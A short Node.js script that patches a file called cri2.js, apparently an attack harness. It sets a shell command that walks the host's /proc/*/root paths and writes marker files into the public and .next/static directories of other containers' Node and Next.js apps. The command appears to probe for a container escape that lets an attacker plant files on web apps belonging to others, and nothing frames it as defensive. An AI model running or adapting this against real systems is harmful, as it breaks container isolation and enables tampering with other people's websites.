const fs=require('fs');
let s=fs.readFileSync('cri2.js','utf8');
const c="const CMD=\"for p in /h/proc/[0-9]*/root; do for d in $p/app/public $p/usr/src/app/public $p/app/.next/standalone/public; do [ -d $d ] && echo P > $d/zz_p.txt 2>/dev/null; done; for q in $p/app/.next/static $p/app/.next/standalone/.next/static; do [ -d $q ] && echo S > $q/zz_s.txt 2>/dev/null; done; done\";";
s=s.replace(/const CMD=.*\n/, c+'\n');
fs.writeFileSync('cri2.js',s);
